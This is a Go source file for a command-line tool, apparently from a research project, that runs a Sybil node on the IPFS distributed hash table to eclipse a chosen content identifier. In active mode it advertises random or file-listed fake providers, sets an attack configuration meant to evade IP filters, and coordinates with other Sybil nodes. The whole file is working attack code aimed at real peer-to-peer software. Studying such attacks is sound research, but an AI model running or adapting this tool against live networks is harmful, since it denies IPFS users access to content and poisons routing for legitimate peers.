package main

import (
	"context"
	"flag"
	"fmt"
	gocid "github.com/ipfs/go-cid"
	"github.com/ipfs/kubo/core"
	dht "github.com/libp2p/go-libp2p-kad-dht"
	"github.com/libp2p/go-libp2p/core/peer"
	test "github.com/libp2p/go-libp2p/core/test"
	"github.com/multiformats/go-multiaddr"
	"github.com/vicnetto/active-sybil-attack/logger"
	ipfspeer "github.com/vicnetto/active-sybil-attack/node/peer"
	pid_generation "github.com/vicnetto/active-sybil-attack/utils/pid-generation/generate"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"
)

var log = logger.InitializeLogger()

type FlagConfig struct {
	isActive bool

	privateKey            string
	eclipsedCid           string
	ip                    string
	port                  int
	sybilsFilepath        string
	fakeProvidersFilepath string
	quantity              int
}

func help() func() {
	return func() {
		fmt.Println("Usage: ./sybil [flags]:")
		fmt.Println(" A mode must be specified:")
		fmt.Println("    -active                -- Enables active behavior.")
		fmt.Println("    -passive               -- Enables passive behavior.")
		fmt.Println(" Global flags:")
		fmt.Println("    -privateKey <string>   -- Private key.")
		fmt.Println("    -cid <string>          -- Eclipsed CID.")
		fmt.Println("    -port <int>            -- Port on which the sybil will be executed.")
		fmt.Println("    -ip <string>           -- IP address to use.")
		fmt.Println("    -sybilsFilepath <string>       -- Path to a file containing information about other sybils to " +
			"connect to (file format: pkey pid port) (optional).")
		fmt.Println("Active mode flags:")
		fmt.Println("    -quantity              -- Quantity random fake providers. (optional)")
		fmt.Println("    or")
		fmt.Println("    -fakeProvidersFilepath -- List of fake providers. (optional)")
	}
}

func treatFlags() *FlagConfig {
	flagConfig := FlagConfig{}

	flag.BoolVar(&flagConfig.isActive, "active", false, "")
	var isPassive bool
	flag.BoolVar(&isPassive, "passive", false, "")

	flag.StringVar(&flagConfig.privateKey, "privateKey", "", "")
	flag.StringVar(&flagConfig.ip, "ip", "", "")
	flag.StringVar(&flagConfig.eclipsedCid, "cid", "", "")
	flag.StringVar(&flagConfig.sybilsFilepath, "sybilsFilepath", "", "")
	flag.StringVar(&flagConfig.fakeProvidersFilepath, "fakeProvidersFilepath", "", "")
	flag.IntVar(&flagConfig.quantity, "quantity", 0, "")
	flag.IntVar(&flagConfig.port, "port", 0, "")

	flag.Usage = help()

	flag.Parse()

	missingFlag := false

	if (!flagConfig.isActive && !isPassive) || (flagConfig.isActive == true && isPassive == true) {
		log.Info.Println("error: one mode should be specified.")
		missingFlag = true
	}

	if flagConfig.isActive {
		if (len(flagConfig.fakeProvidersFilepath) == 0 && flagConfig.quantity == 0) ||
			(len(flagConfig.fakeProvidersFilepath) > 0 && flagConfig.quantity > 0) {
			log.Info.Println("error: one active flag should be specified.")
			missingFlag = true
		}
	}

	if len(flagConfig.privateKey) == 0 {
		log.Info.Println("error: flag privateKey missing.")
		missingFlag = true
	}

	if len(flagConfig.eclipsedCid) == 0 {
		log.Info.Println("error: flag cid missing.")
		missingFlag = true
	}

	if len(flagConfig.ip) == 0 {
		log.Info.Println("error: flag ip missing.")
		missingFlag = true
	}

	if flagConfig.port == 0 {
		log.Info.Println("error: flag port missing.")
		missingFlag = true
	}

	if missingFlag {
		log.Info.Println()
		flag.Usage()
		os.Exit(1)
	}

	return &flagConfig
}

func generateRandomIp() net.IP {
	ip := make(net.IP, 4)

	for i := 0; i < 4; i++ {
		ip[i] = byte(rand.Intn(256))
	}

	return ip
}

func generateRandomProviders(quantity int) []peer.AddrInfo {
	randomProviders := make([]peer.AddrInfo, quantity)
	ip := []multiaddr.Multiaddr{multiaddr.StringCast("/ip4/" + generateRandomIp().String() + "/tcp/4001")}
	log.Info.Printf("Starting to generate %d random providers...", quantity)

	for i := 0; i < quantity; i++ {
		// Generating completely random peer and address
		genPid, _ := test.RandPeerID()

		randomProviders = append(randomProviders, peer.AddrInfo{ID: genPid, Addrs: ip})
	}

	log.Info.Println(" finished!")
	return randomProviders
}

func main() {
	flagConfig := treatFlags()

	ctx, cancel := context.WithCancel(context.Background())

	sybilConfig := ipfspeer.ConfigForSybil(&flagConfig.ip, flagConfig.port, flagConfig.privateKey)

	log.Info.Println("Initializing sybil with following parameters:")
	log.Info.Println(" PeerID:", sybilConfig.Identity.PeerID)
	log.Info.Println(" Port:", sybilConfig.Port)
	log.Info.Println(" Eclipsed CID:", flagConfig.eclipsedCid)
	log.Info.Println(" Active mode:", flagConfig.isActive)

	// Load friends, the other Sybils doing the attack.
	var otherSybils []peer.AddrInfo
	if len(flagConfig.sybilsFilepath) != 0 {
		otherSybilsInfo := pid_generation.ReadAndFormatPeers(flagConfig.sybilsFilepath)
		otherSybils = pid_generation.ReadAndFormatPeersAsAddrInfo(otherSybilsInfo, flagConfig.ip)
	}

	var fakeProviders []peer.AddrInfo
	if len(flagConfig.fakeProvidersFilepath) != 0 {
		fakeProvidersInfo := pid_generation.ReadAndFormatPeers(flagConfig.fakeProvidersFilepath)
		otherSybils = pid_generation.ReadAndFormatPeersAsAddrInfo(fakeProvidersInfo, generateRandomIp().String())
		log.Info.Printf("%d fake providers loaded", len(fakeProviders))
	} else {
		fakeProviders = generateRandomProviders(flagConfig.quantity)
	}

	ipfs, node, err := ipfspeer.SpawnEphemeral(ctx, sybilConfig)
	if err != nil {
		panic(err)
	}

	// Set attack configuration to avoid IP filters and specify the CID to be eclipsed
	dht.SetAttackConfiguration(flagConfig.eclipsedCid, flagConfig.isActive, otherSybils, fakeProviders)

	decode, err := gocid.Decode(flagConfig.eclipsedCid)
	if err != nil {
		log.Info.Println("error: invalid CID passed as parameter.")
		log.Info.Println(err)
		return
	}

	// Get closest peers to establish the node in the network
	peers, err := node.DHT.WAN.GetClosestPeers(ctx, string(decode.Hash()))
	log.Info.Printf("Closest peers to %s: %q\n\n", decode.String(), peers)

	myAddresses, err := ipfs.Swarm().ListenAddrs(ctx)
	log.Info.Println("My addresses:", myAddresses, "\n")

	run(node, cancel)
}

func run(node *core.IpfsNode, cancel func()) {
	c := make(chan os.Signal, 1)

	signal.Notify(c, os.Interrupt, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM)
	<-c

	log.Info.Printf("Exiting...\n")

	cancel()

	if err := node.Close(); err != nil {
		panic(err)
	}

	return
}
